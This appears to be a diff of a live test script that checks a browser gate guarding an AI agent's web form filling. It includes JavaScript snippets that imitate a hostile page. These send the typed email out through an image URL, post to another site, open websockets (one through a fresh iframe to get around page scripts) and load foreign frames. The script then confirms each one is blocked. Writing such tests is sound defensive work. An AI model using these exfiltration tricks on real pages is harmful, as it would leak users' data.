@@ -1,6 +1,8 @@
-"""The browser's gate and live view on a real Steel session, against a public form page.
+"""The browser's gate, the action's question and the live view on a real Steel session, against
+public pages (httpbin.org's form, a font from Google's, an image, a websocket and a frame of
+other sites, the page's own scripts doing what a hostile page would).
 
-    ~/sandy_app_venv/bin/python scripts/steel_live_check.py            # gate, header, live view
+    ~/sandy_app_venv/bin/python scripts/steel_live_check.py            # gate, real click, live view
     ~/sandy_app_venv/bin/python scripts/steel_live_check.py --fill     # and a whole fill, real model
 
 Needs `STEEL_API_KEY` in `.env` (and the chat model's settings for `--fill`). It costs a few cents
@@ -12,6 +14,7 @@ from __future__ import annotations
 import argparse
 import asyncio
 import json
+import os
 import sys
 import time
 from pathlib import Path
@@ -20,9 +23,31 @@ ROOT = Path(__file__).resolve().parents[1]
 sys.path.insert(0, str(ROOT / "cloud"))
 
 FORM = "https://httpbin.org/forms/post"
+EMAIL = "sandy.test.4417@example.com"
 FILL_JS = """(() => { const f = document.forms[0];
-  f.custname.value = "Sandy Test"; f.custtel.value = "000"; f.custemail.value = "test@example.com";
-  return true; })()"""
+  f.custname.value = "Sandy Test"; f.custtel.value = "000"; f.custemail.value = "%s";
+  return true; })()""" % EMAIL
+ANSWERED_JS = "document.body.innerText.includes('Sandy Test') && location.pathname === '/post'"
+FONT_JS = """new FontFace("Live", "url(https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2)")
+  .load().then(() => "loaded").catch((e) => "failed")"""
+STYLE_JS = """new Promise((done) => { const l = document.createElement("link"); l.rel = "stylesheet";
+  l.href = "https://fonts.googleapis.com/css2?family=Roboto"; l.onload = () => done("loaded");
+  l.onerror = () => done("failed"); document.head.appendChild(l); })"""
+LEAK_JS = """new Promise((done) => { const i = new Image(); i.onload = () => done("loaded");
+  i.onerror = () => done("failed"); i.src = "https://www.google.com/favicon.ico?e=" + encodeURIComponent("%s"); })""" % EMAIL
+SOCKET_JS = """new Promise((done) => { let s; try { s = new WebSocket("wss://ws.postman-echo.com/raw"); }
+  catch (e) { return done("refused"); }
+  s.onopen = () => { s.send("x"); done("open"); }; s.onerror = () => done("failed");
+  setTimeout(() => done("state " + s.readyState), 6000); })"""
+# The same, from a fresh frame of its own (a way round a page's own scripts).
+SOCKET_FRAME_JS = SOCKET_JS.replace("new WebSocket(", "new (document.body.appendChild(document.createElement("
+                                    "'iframe')).contentWindow.WebSocket)(")
+FRAME = "https://httpbingo.org/forms/post"
+FRAME_JS = """new Promise((done) => { const f = document.createElement("iframe"); f.src = "%s";
+  document.body.appendChild(f); setTimeout(() => done(true), 5000); })""" % FRAME
+POST_OTHER_JS = """fetch("https://httpbingo.org/post", {method: "POST", body: "x=1", mode: "no-cors"})
+  .then(() => "sent").catch(() => "blocked")"""
+BUTTON_JS = "document.querySelector('form button')"
 
 
 def report(name: str, ok: bool, detail: str = "") -> bool:
@@ -30,117 +55,109 @@ def report(name: str, ok: bool, detail: str = "") -> bool:
     return ok
 
 
-async def header_auth(session_id: str) -> bool:
-    """Whether Steel takes the key in a header on the connect address (so it is never in a URL)."""
-    from cdp_use.client import CDPClient
-
-    from app import config
-    client = CDPClient(f"wss://connect.steel.dev?sessionId={session_id}",
-                       additional_headers={"steel-api-key": config.STEEL_API_KEY})
-    try:
-        await asyncio.wait_for(client.start(), 20)
-        targets = await asyncio.wait_for(client.send.Target.getTargets(), 20)
-        return bool(targets.get("targetInfos") is not None)
-    except Exception as exc:  # noqa: BLE001 — a probe: any failure means no
-        print(f"      header connect refused: {type(exc).__name__}")
-        return False
-    finally:
-        try:
-            await client.stop()
-        except Exception:  # noqa: BLE001
-            pass
-
-
-CLICK_JS = "(() => { document.querySelector('form button').click(); return true; })()"
-ANSWERED_JS = "document.body.innerText.includes('Sandy Test') && location.pathname === '/post'"
+async def _fresh(session_id: str):
+    from app.brain import browser_gate
+    from app.integrations import browser_cdp, steel_client
+    client = await browser_cdp.connect(steel_client.connect_url(session_id))
+    gate = browser_gate.Gate("httpbin.org")
+    gate.acted("type", EMAIL)
+    gate.last = None
+    await browser_gate.install(client, gate)
+    tab = await browser_cdp.first_page(client)
+    await browser_cdp.goto(client, tab, FORM)
+    return client, gate, tab
 
 
 async def gate_checks(session_id: str) -> list:
     from app.brain import browser_gate
-    from app.integrations import browser_cdp, steel_client
+    from app.features import browser_job
+    from app.integrations import browser_cdp
     results = []
-    client = await browser_cdp.connect(steel_client.connect_url(session_id))
+    client, gate, tab = await _fresh(session_id)
     try:
-        gate = browser_gate.Gate("httpbin.org")
-        await browser_gate.install(client, gate)
-        tab = await browser_cdp.first_page(client)
-        await browser_cdp.goto(client, tab, FORM)
         results.append(report("the form page opens behind the gate",
                               "forms/post" in await browser_cdp.where(client, tab)))
+        # 1. A script's own submit, nothing approved: blocked, never answered.
         await browser_cdp.evaluate(client, tab, FILL_JS)
-
-        # 1. A script that submits the form by itself, with nothing clicked: blocked, never answered.
         await browser_cdp.evaluate(client, tab, "document.forms[0].submit(); true")
         await asyncio.sleep(3)
         answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
-        results.append(report("a script's form submit does not leave",
-                              not answered and not gate.sent and gate.held is None and len(gate.blocked) >= 1,
-                              f"blocked {len(gate.blocked)}"))
+        results.append(report("a script's form submit does not leave", not answered and not gate.sent
+                              and gate.breach is None, f"blocked {len(gate.blocked)}"))
 
-        # 2. A script's fetch POST: blocked, the page's promise fails.
+        # 2. A font and a style from another site load: the page works.
         await browser_cdp.goto(client, tab, FORM)
-        fetched = await browser_cdp.evaluate(client, tab, "fetch('/post', {method: 'POST', body: 'x=1'})"
-                                             ".then(() => 'sent').catch(() => 'blocked')")
-        results.append(report("a script's fetch POST does not leave", fetched == "blocked" and not gate.sent,
-                              str(fetched)))
+        font, style = await browser_cdp.evaluate(client, tab, FONT_JS), await browser_cdp.evaluate(client, tab, STYLE_JS)
+        results.append(report("a font and a style from another site load", font == "loaded" and style == "loaded"
+                              and gate.breach is None, f"font {font}, style {style}"))
 
-        # 3. The send button clicked, as the agent does: held with its body, never answered.
-        await browser_cdp.evaluate(client, tab, FILL_JS)
-        gate.acted("click")
-        await browser_cdp.evaluate(client, tab, CLICK_JS)
-        await asyncio.sleep(3)
-        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
-        held = dict(gate.held or {})
-        results.append(report("a click on send is held for his yes, its body kept",
-                              bool(held) and not gate.sent and not answered and "Sandy+Test" in held.get("body", ""),
-                              f"{held.get('method')} {held.get('content_type')}"))
+        # 3. A send to another site with nothing of his in it: blocked, the fill goes on.
+        posted = await browser_cdp.evaluate(client, tab, POST_OTHER_JS)
+        results.append(report("a send to another site is blocked", posted == "blocked" and gate.breach is None,
+                              str(posted)))
+
+        # 4. A frame of another site (a form in it): never loads.
+        await browser_cdp.evaluate(client, tab, FRAME_JS)
+        framed = [u for m, u in gate.blocked if u.startswith(FRAME)]
+        results.append(report("a frame of another site never loads", bool(framed) and gate.breach is None,
+                              f"blocked {framed[:1]}"))
+
+        # 5. A websocket: never opens; one made anyway stops the fill.
+        sock = await browser_cdp.evaluate(client, tab, SOCKET_JS)
+        results.append(report("a websocket never opens", sock != "open", f"{sock}, gate {gate.breach}"))
+        sock = await browser_cdp.evaluate(client, tab, SOCKET_FRAME_JS)
+        results.append(report("nor one from a fresh frame", sock != "open", f"{sock}, gate {gate.breach}"))
     finally:
         await client.stop()
 
-    # 4. His yes, as `browser_job._send` does it: the held send itself, once.
-    client = await browser_cdp.connect(steel_client.connect_url(session_id))
+    # 6. An image to another site carrying what she typed: blocked and the fill stopped.
+    client, gate, tab = await _fresh(session_id)
     try:
-        gate = browser_gate.Gate("httpbin.org")
-        await browser_gate.install(client, gate)
-        from app.features.browser_job import _resend_js
-        gate.replay(held)
-        tab = await browser_cdp.first_page(client)
-        await browser_cdp.goto(client, tab, FORM)
-        await browser_cdp.evaluate(client, tab, _resend_js(held))
-        await asyncio.sleep(1)
-        await browser_cdp.settle(client, tab, 15)
-        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
-        results.append(report("with his yes, the held send goes once and the page answers",
-                              len(gate.sent) == 1 and bool(answered), f"sent {len(gate.sent)}"))
+        leaked = await browser_cdp.evaluate(client, tab, LEAK_JS)
+        results.append(report("an image carrying what she typed is stopped", leaked == "failed"
+                              and gate.breach == browser_gate.LEAK, f"{leaked}, gate {gate.breach}"))
+    finally:
+        await client.stop()
 
-        # 5. Another send after it: held again, not sent.
+    # 7. The send button, unasked: blocked; with his yes, the real click on it sends once.
+    client, gate, tab = await _fresh(session_id)
+    try:
+        await browser_cdp.evaluate(client, tab, FILL_JS)
+        found = await client.send.Runtime.evaluate(params={"expression": BUTTON_JS}, session_id=tab)
+        node = (await client.send.DOM.describeNode(params={"objectId": found["result"]["objectId"]},
+                                                   session_id=tab))["node"]["backendNodeId"]
+        target = next(t["targetId"] for t in (await client.send.Target.getTargets())["targetInfos"]
+                      if t.get("type") == "page")
+        row = {"_id": "live", "site": "httpbin.org"}
+        out = await browser_job._act(row, gate, client, gate.sessions[target],
+                                     {"kind": "click", "target": target, "node": node, "label": "submit"})
+        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
+        results.append(report("his yes is the real click on the same page, sent once",
+                              out.get("status") == browser_job.DONE and bool(answered) and len(gate.sent) >= 1,
+                              f"{out.get('status')} {out.get('reason', '')} sent {len(gate.sent)}"))
+        # A send after that moment: blocked again.
+        gate.approved_until = 0
         await browser_cdp.goto(client, tab, FORM)
         await browser_cdp.evaluate(client, tab, FILL_JS)
-        gate.acted("click")
-        await browser_cdp.evaluate(client, tab, CLICK_JS)
+        before = len(gate.sent)
+        await browser_cdp.evaluate(client, tab, "document.forms[0].submit(); true")
         await asyncio.sleep(3)
-        answered = await browser_cdp.evaluate(client, tab, ANSWERED_JS)
-        results.append(report("a second send is not let through", len(gate.sent) == 1 and not answered,
-                              f"sent {len(gate.sent)}"))
+        results.append(report("a second send is not let through", len(gate.sent) == before
+                              and not await browser_cdp.evaluate(client, tab, ANSWERED_JS)))
 
-        # 6. A send from a tab opened later: the gate is on it before it loads.
-        before = {t["targetId"] for t in (await client.send.Target.getTargets()).get("targetInfos") or []}
+        # 8. A tab opened later: the gate is on it before it loads.
         await browser_cdp.evaluate(client, tab, "window.open('" + FORM + "', '_blank'); true")
         await asyncio.sleep(5)
-        new = [t for t in (await client.send.Target.getTargets()).get("targetInfos") or []
-               if t.get("type") == "page" and t["targetId"] not in before]
-        if new:
-            other = (await client.send.Target.attachToTarget(
-                params={"targetId": new[0]["targetId"], "flatten": True}))["sessionId"]
-            await browser_cdp.settle(client, other, 15)
-            await browser_cdp.evaluate(client, other, FILL_JS)
-            await browser_cdp.evaluate(client, other, "document.forms[0].submit(); true")
+        other = [s for t, s in gate.sessions.items() if t != target]
+        if other:
+            await browser_cdp.settle(client, other[0], 15)
+            await browser_cdp.evaluate(client, other[0], FILL_JS)
+            await browser_cdp.evaluate(client, other[0], "document.forms[0].submit(); true")
             await asyncio.sleep(3)
-            answered = await browser_cdp.evaluate(client, other, ANSWERED_JS)
-            results.append(report("a new tab's send is blocked too", len(gate.sent) == 1 and not answered,
-                                  f"blocked {len(gate.blocked)}"))
+            results.append(report("a new tab's send is blocked too", len(gate.sent) == before
+                                  and not await browser_cdp.evaluate(client, other[0], ANSWERED_JS)))
         else:
-            results.append(report("a new tab's send is blocked too", False, "no new tab opened"))
+            results.append(report("a new tab's send is blocked too", False, "no new tab was covered"))
     finally:
         await client.stop()
     return results
@@ -156,41 +173,84 @@ def live_view(debug_url: str) -> bool:
                   f"HTTP {resp.status_code}")
 
 
-def whole_fill() -> bool:
-    """A whole fill through `page_fill` on the real model and Steel: held, then sent on his yes."""
-    import os
-
+def _world():
     import mongomock
 
     from app import db as appdb
     from app.blocks import init_blocks
-    from app.brain import tools
-    from app.brain.ctx import TurnCtx
-    from app.features import browser_job, browser_sites
-    from app.utils.user_profiles import active_user_profile_context
-
     os.environ["SANDY_FLAGS"] = json.dumps({"browser": ["live"]})
     d = mongomock.MongoClient().db
     appdb.configure(d)
     init_blocks(d)
     d["sandy_users"].insert_one({"_id": "live"})
-    who = {"chat_id": "live", "relation": "user", "permissions": "all"}
-    with active_user_profile_context(who):
+    return {"chat_id": "live", "relation": "user", "permissions": "all"}
+
+
+def _status(session_id: str) -> str:
+    import requests
+
+    from app import config
+    resp = requests.get(f"https://api.steel.dev/v1/sessions/{session_id}", timeout=20,
+                        headers={"steel-api-key": config.STEEL_API_KEY})
+    return str((resp.json() if resp.ok else {}).get("status") or resp.status_code)
+
+
+def leaking_fill() -> bool:
+    """A whole fill on a page that leaks what she typed: stopped, its Steel session closed, told."""
+    from app.brain import tools
+    from app.brain.ctx import TurnCtx
+    from app.features import browser_job, browser_sites
+    from app.integrations import browser_cdp
+    from app.utils.user_profiles import active_user_profile_context
+
+    async def leaks(row, gate, client, tab, user_id, asked):
+        gate.acted("type", EMAIL)
+        await browser_cdp.evaluate(client, tab, LEAK_JS)
+        await asyncio.sleep(10)
+        return {"status": browser_job.DONE, "result": "the page leaked and nothing stopped it"}
+    real, browser_job.AGENT = browser_job.AGENT, leaks
+    try:
+        with active_user_profile_context(_world()):
+            browser_sites.set_level("httpbin.org", browser_sites.SUBMIT)
+            out = tools.execute("page_fill", {"url": FORM, "goal": "order", "details": f"email: {EMAIL}"},
+                                TurnCtx(user_id="live", thread_id="t1"))
+            row = (browser_job.open_jobs() or [{}])[0]
+            from app.db import get_db
+            job = get_db()[browser_job.COLLECTION].find_one({}) or {}
+    finally:
+        browser_job.AGENT = real
+    time.sleep(2)
+    status = _status(job.get("steel_id", ""))
+    return report("a page that leaks stops the whole fill and closes its session",
+                  out.get("ok") is False and job.get("reason") == "leak" and status == "released" and not row,
+                  f"{job.get('status')} {job.get('reason')}, Steel {status}: {(out.get('reply') or '')[:80]}")
+
+
+def whole_fill() -> bool:
+    """A whole fill through `page_fill` on the real model and Steel: asked before the click, then
+    the real click on his yes."""
+    from app.brain import tools
+    from app.brain.ctx import TurnCtx
+    from app.features import browser_job, browser_sites
+    from app.utils.user_profiles import active_user_profile_context
+
+    with active_user_profile_context(_world()):
         browser_sites.set_level("httpbin.org", browser_sites.SUBMIT)
         began = time.monotonic()
         asked = tools.execute("page_fill", {"url": FORM, "goal": "order a small pizza for pickup",
-                                            "details": "Name: Sandy Test, phone: 000, email: test@example.com"},
+                                            "details": f"Name: Sandy Test, phone: 000, email: {EMAIL}"},
                               TurnCtx(user_id="live", thread_id="t1"))
         print(f"      fill took {time.monotonic() - began:.0f}s: {json.dumps({k: asked.get(k) for k in ('ok', 'needs_confirmation')})}")
         if not asked.get("needs_confirmation"):
             print(f"      answer: {asked.get('reply') or asked.get('error')}")
-            return report("a whole fill is held for his yes", False)
-        report("a whole fill is held for his yes", True, asked["summary"][:120])
+            return report("a whole fill asks before its click", False)
+        report("a whole fill asks before its click", True, asked["summary"][:120])
         ctx = TurnCtx(user_id="live", thread_id="t1")
         ctx.confirmed, ctx.held_ids = True, asked["ids"]
         sent = tools.execute("page_fill", {}, ctx)
         row = browser_job.get(asked["ids"][0]) or {}
-        return report("his yes sends it once", sent.get("ok") is True and row.get("status") == browser_job.DONE,
+        return report("his yes clicks it and it is sent", sent.get("ok") is True and row.get("status") == browser_job.DONE
+                      and '"args"' in (row.get("result") or ""),
                       (sent.get("reply") or "")[:120])
 
 
@@ -211,12 +271,11 @@ def main() -> int:
     session = steel_client.create_session()
     began = time.monotonic()
     try:
-        # A finding, not a check: with no header, the key stays in the address and the log hides it.
-        print(f"INFO  Steel takes the key in a header: {'yes' if asyncio.run(header_auth(session['id'])) else 'no'}")
         results += asyncio.run(gate_checks(session["id"]))
         results.append(live_view(session["debug_url"]))
     finally:
         steel_client.release(session["id"], time.monotonic() - began)
+    results.append(leaking_fill())
     if args.fill:
         results.append(whole_fill())
     print(f"\n{sum(results)}/{len(results)} passed")
